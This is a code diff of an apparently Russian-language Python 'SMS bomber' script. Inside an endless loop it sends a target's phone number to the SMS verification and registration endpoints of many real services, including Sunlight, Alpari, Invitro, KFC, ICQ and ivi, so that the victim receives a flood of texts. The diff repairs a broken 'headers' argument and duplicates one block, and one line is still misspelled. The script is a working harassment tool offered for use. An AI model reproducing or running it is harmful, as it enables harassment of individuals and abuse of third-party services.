@@ -135,119 +135,120 @@ while True:
             print("[-] NewNext откинулся!" + str(ex))
 
         try: 
-            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': '+'+_phone}, headers={}) 
             print("[+] Санлайт вкинулся!") 
         except Exception as ex:  
             print("[-] Санлайт откинулся!" + str(ex))
             
         try: 
-            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', data={'phone': '+'+_phone}, headers={}) 
             print("[+] alpari вкинулся!") 
         except Exception as ex:  
             print("[-] alpari откинулся!" + str(ex))
 
         try: 
-            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': '+'+_phone}, headers={}) 
             print("[+] invitro вкинулся!") 
         except Exception as ex:  
             print("[-] invitro откинулся!" + str(ex))
 
         try: 
-            requests.post('https://online.sbis.ru/reg/service/', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://online.sbis.ru/reg/service/', data={'phone': '+'+_phone}, headers={}) 
             print("[+] onlinesbs вкинулся!") 
         except Exception as ex:  
             print("[-] onlinesbs откинулся!" + str(ex))
 
 
         try: 
-            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', data={'phone': '+'+_phone}, headers={}) 
             print("[+] psnank вкинулся!") 
         except Exception as ex:  
             print("[-] psbank откинулся!" + str(ex))
 
 
         try: 
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': '+'+_phone}, headers={}) 
             print("[+] beltelecom вкинулся!") 
         except Exception as ex:  
             print("[-] beltelecom откинулся!" + str(ex))
 
 
         try: 
-            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': '+'+_phone}, headers={}) 
             print("[+] karusel вкинулся!") 
         except Exception as ex:  
             print("[-] karusel откинулся!" + str(ex))
 
         try: 
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', data={'phone': '+'+_phone}, headers={}) 
             print("[+] kfc вкинулся!") 
         except Exception as ex:  
             print("[-] kfc откинулся!" + str(ex))
 
         try: 
-            requests.post('https://api.carsmile.com/', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://api.carsmile.com/', data={'phone': '+'+_phone}, headres={}) 
             print("[+] carsmile вкинулся!") 
         except Exception as ex:  
             print("[-] carsmine откинулся!" + str(ex))
 
-        try:
-            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
-        except:
-            s=s
-
         try: 
-            requests.post('https://www.citilink.ru/registration/confirm/phone/+', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://www.citilink.ru/registration/confirm/phone/+', data={'phone': '+'+_phone}, headers={}) 
             print("[+] citilink вкинулся!") 
         except Exception as ex:  
             print("[-] citilink откинулся!" + str(ex))
 
         try: 
-            requests.post('https://findclone.ru/register', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://www.citilink.ru/registration/confirm/phone/+', data={'phone': '+'+_phone}, headers={}) 
+            print("[+] citilink вкинулся!") 
+        except Exception as ex:  
+            print("[-] citilink откинулся!" + str(ex))
+
+        try: 
+            requests.post('https://findclone.ru/register', data={'phone': '+'+_phone}, headers={}) 
             print("[+] findclone вкинулся!") 
         except Exception as ex:  
             print("[-] findclone откинулся!" + str(ex))
 
         try: 
-            requests.post('https://guru.taxi/api/v1/driver/session/verify', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://guru.taxi/api/v1/driver/session/verify', data={'phone': '+'+_phone}, headers={}) 
             print("[+] guru.taxi вкинулся!") 
         except Exception as ex:  
             print("[-] guru.taxi откинулся!" + str(ex))
 
 
         try: 
-            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'phone': '+'+_phone}, headers={}) 
             print("[+] icq вкинулся!") 
         except Exception as ex:  
             print("[-] icq откинулся!" + str(ex))
 
         try: 
-            requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru', data={'phone': '+'+_phone}, headers={}) 
             print("[+] indrive вкинулся!") 
         except Exception as ex:  
             print("[-] indrive откинулся!" + str(ex))
 
         try: 
-            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={'phone': '+'+_phone}, headers={}) 
             print("[+] invitro вкинулся!") 
         except Exception as ex:  
             print("[-] invitto откинулся!" + str(ex))
 
 
         try: 
-            requests.post('https://findclone.ru/register', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://findclone.ru/register', data={'phone': '+'+_phone}, headers={}) 
             print("[+] findclone вкинулся!") 
         except Exception as ex:  
             print("[-] findclone откинулся!" + str(ex))
 
         try: 
-            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', data={'phone': '+'+_phone}, headers={}) 
             print("[+] pmsm вкинулся!") 
         except Exception as ex:  
             print("[-] pmsm откинулся!" + str(ex))
 
         try: 
-            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={'phone': '+'+_phone}, ={}) 
+            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={'phone': '+'+_phone}, headers={}) 
             print("[+] ivi вкинулся!") 
         except Exception as ex:  
             print("[-] ivi откинулся!" + str(ex))
